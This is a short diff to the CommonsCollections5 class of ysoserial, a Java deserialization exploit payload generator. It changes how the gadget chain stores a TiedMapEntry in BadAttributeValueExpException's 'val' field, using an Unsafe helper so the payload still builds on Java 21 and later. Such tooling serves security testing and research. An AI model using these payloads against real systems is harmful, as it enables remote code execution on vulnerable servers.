@@ -1,6 +1,5 @@
 package ysoserial.payloads;
 
-import java.lang.reflect.Field;
 import java.lang.reflect.InvocationHandler;
 import java.util.HashMap;
 import java.util.Map;
@@ -79,9 +78,8 @@ public class CommonsCollections5 extends PayloadRunner implements ObjectPayload<
 		TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
 
 		BadAttributeValueExpException val = new BadAttributeValueExpException(null);
-		Field valfield = val.getClass().getDeclaredField("val");
-        Reflections.setAccessible(valfield);
-		valfield.set(val, entry);
+		// Java 21+ narrowed val from Object to String; use Unsafe to bypass the type check
+		Reflections.unsafeSetFieldValue(val, "val", entry);
 
 		Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain
 
